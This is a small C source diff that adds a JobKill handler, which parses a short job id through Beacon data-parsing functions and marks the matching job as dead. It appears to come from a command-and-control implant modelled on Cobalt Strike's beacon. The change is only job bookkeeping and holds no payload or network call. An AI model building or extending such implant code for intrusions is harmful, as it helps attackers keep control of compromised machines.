@@ -1,5 +1,6 @@
 #include "pch.h"
 
+#include "beacon.h"
 
 
 typedef struct _JOB_ENTRY
@@ -87,4 +88,19 @@ void JobCleanup()
 		free(job);
 	}
 
+}
+
+void JobKill(char* buffer, int size)
+{
+	datap parser;
+	BeaconDataParse(&parser, buffer, size);
+	short id = BeaconDataShort(&parser);
+
+	for (JOB_ENTRY* job = gJobs; job; job = job->next)
+	{
+		if (job->id == id)
+			job->isDead = TRUE;
+	}
+
+	JobCleanup();
 }
